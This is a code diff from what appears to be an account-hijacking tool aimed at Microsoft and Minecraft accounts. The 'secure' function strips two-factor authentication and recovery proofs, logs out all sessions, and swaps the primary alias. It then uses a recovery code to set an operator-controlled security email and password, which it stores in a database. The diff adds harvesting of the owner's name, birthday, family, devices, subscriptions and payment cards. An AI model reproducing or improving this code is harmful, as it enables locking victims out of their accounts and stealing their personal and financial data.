@@ -1,21 +1,27 @@
+from securing.utils.security.change_primary_alias import change_primary_alias
+from securing.utils.security.add_authenticator import add_authenticator
+from securing.utils.security.get_recovery_code import get_recovery_code
 from securing.utils.security_information import security_information
-from securing.utils.change_primary_alias import change_primary_alias
-from securing.utils.add_authenticator import add_authenticator
-from securing.utils.get_recovery_code import get_recovery_code
-from securing.utils.remove_services import remove_services
-from securing.utils.get_owner_info import get_owner_info
-from securing.utils.delete_aliases import delete_aliases
-from securing.utils.remove_proof import remove_proof
-from securing.utils.remove_zyger import remove_zyger
-from securing.utils.get_cookies import get_cookies
-from securing.utils.get_profile import get_profile
-from securing.utils.remove_2fa import remove_2fa
-from securing.utils.logout_all import logout_all
-from securing.utils.recovery import recover
-from securing.utils.get_amrp import get_amrp
-from securing.utils.get_ssid import get_ssid
-from securing.utils.get_amc import get_amc
-from securing.utils.get_t import get_t
+from securing.utils.security.remove_services import remove_services
+from securing.utils.security.delete_aliases import delete_aliases
+from securing.utils.security.remove_proof import remove_proof
+from securing.utils.security.remove_zyger import remove_zyger
+from securing.utils.security.remove_2fa import remove_2fa
+from securing.utils.security.recovery import recover
+
+from securing.utils.ogi.get_subscriptions import get_subscriptions
+from securing.utils.ogi.get_owner_info import get_owner_info
+from securing.utils.ogi.get_devices import get_devices
+from securing.utils.ogi.get_family import get_family
+from securing.utils.ogi.get_cards import get_cards
+
+from securing.utils.cookies.get_cookies import get_cookies
+from securing.utils.cookies.get_amc import get_amc
+
+from securing.utils.security.logout_all import logout_all
+
+from minecraft.get_profile import get_profile
+from minecraft.get_ssid import get_ssid
 
 from minecraft.get_namechange import get_username_info
 from minecraft.get_method import get_method
@@ -26,6 +32,7 @@ from database.database import DBConnection
 import httpx
 import uuid
 import json
+import time
 
 database = DBConnection()
 
@@ -38,25 +45,10 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     enable_2fa = config["autosecure"]["enable_2fa"]
     domain = config["domain"]
     
-    apicanary = await get_cookies(session) 
-    
-    T = await get_t(session)
-    print("[+] - Found T")
-
     # Token needed to make API requests for the account
-    verificationToken = await get_amc(session)
+    verification_token = await get_amc(session)
 
-    # Gets account info via microsofts API
-    ownerInfo = await get_owner_info(session, verificationToken)
-
-    if ownerInfo:
-        print("[+] - Got Owner Info")
-        
-        accountInfo["microsoft"]["firstName"] = ownerInfo["Fname"]
-        accountInfo["microsoft"]["lastName"] = ownerInfo["Lname"]
-        accountInfo["microsoft"]["region"] = ownerInfo["region"]
-        accountInfo["microsoft"]["birthday"] = ownerInfo["birthday"]
-        accountInfo["microsoft"]["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
+    apicanary = await get_cookies(session) 
     
     # Minecraft checking
     print("[~] - Checking Minecraft Account")
@@ -109,10 +101,31 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
         print("[x] - Failed to get XBL (Account has no Xbox Profile)")
         accountInfo["minecraft"]["name"] = "No Minecraft"
 
-    # Security Steps
-    await get_amrp(session, T)
-    print("[+] - Got AMRP")
+    # Gets account info via microsofts API
+    subscriptions = await get_subscriptions(session, verification_token[0])
+    family = await get_family(session, verification_token[0])
+    devices = await get_devices(session, verification_token[0])
+    cards = await get_cards(session, verification_token[0])
 
+    owner_info = await get_owner_info(session, verification_token[1])
+
+    print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
+    accountInfo["microsoft"]["firstName"] = owner_info["firstName"]
+    accountInfo["microsoft"]["lastName"]  = owner_info["lastName"]
+    accountInfo["microsoft"]["fullName"]  = owner_info["fullName"]
+    accountInfo["microsoft"]["region"]    = owner_info["region"]
+    accountInfo["microsoft"]["birthday"]  = owner_info["birthday"]
+    accountInfo["microsoft"]["language"]  = owner_info["msaDisplayLanguage"]
+
+    accountInfo["microsoft"]["family"] = family["members"]
+    accountInfo["microsoft"]["devices"] = devices["devices"]
+    accountInfo["microsoft"]["cards"] = cards["paymentInstruments"]
+    accountInfo["microsoft"]["subscriptions"] = {
+        "active":     subscriptions["active"],
+        "canceled":   subscriptions["canceled"],
+        "commercial": subscriptions["commercial"],
+    }
+        
     # 2FA
     await remove_2fa(session, apicanary)
 
@@ -126,27 +139,26 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
     # Third Party Launchers (Minecraft, Prism)
     await remove_services(session)
 
-    if recovery:
+    securityParameters = json.loads(await security_information(session))
+    print("[+] - Got Security Parameters")
 
-        securityParameters = json.loads(await security_information(session))
-        print("[+] - Got Security Parameters")
+    if securityParameters:
+        # Original Email
+        main_email = securityParameters["email"]
+        print(f"Main EMail: {main_email}")
 
-        if securityParameters:
-
-            # Original Email
-            main_email = securityParameters["email"]
-            print(f"Main EMail: {main_email}")
+        # Changes Primary Alias
+        if replace_alias:
+            print("[~] - Changing Primary Alias")
+            primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
+            change_alias = await change_primary_alias(session, primaryEmail, apicanary)
+            if change_alias:
+                accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
+            else:
+                print(f"[X] - Failed to change Primary Email")
+        
+        if recovery:
             encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]
-
-            # Changes Primary Alias
-            if replace_alias:
-                print("[~] - Changing Primary Alias")
-                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
-                change_alias = await change_primary_alias(session, primaryEmail, apicanary)
-                if change_alias:
-                    accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
-                else:
-                    print(f"[X] - Failed to change Primary Email")
 
             # Gets recovery code
             recovery_code = await get_recovery_code(
@@ -155,11 +167,11 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
                 encryptedNetID
             )
             print(f"[+] - Got Recovery Code | {recovery_code}")
+
             security_email = uuid.uuid4().hex[:16]
             password = uuid.uuid4().hex[:12]
 
             security_email = f"{security_email}@{domain}"
-
             print(f"[+] - Generated Security Email ({security_email})")
             database.add_security_email(security_email, password)
 
@@ -167,15 +179,15 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             print("[~] - Automaticly Securing Account...")
             data = await recover(session, main_email, recovery_code, security_email, password)
 
-            # Delete other login aliases
-            await delete_aliases(session)
-
             if data and data != "invalid":
                 accountInfo["microsoft"]["security_email"] = security_email
-                accountInfo["microsoft"]["recovery_code"] = data["recovery_code"]
+                accountInfo["microsoft"]["recovery_code"] = data
                 accountInfo["microsoft"]["password"] = password
             else:
                 print(f"[X] - Failed to secure this account")
+
+    # Delete other login aliases
+    await delete_aliases(session)
     
     # Add Authenticator
     if enable_2fa:
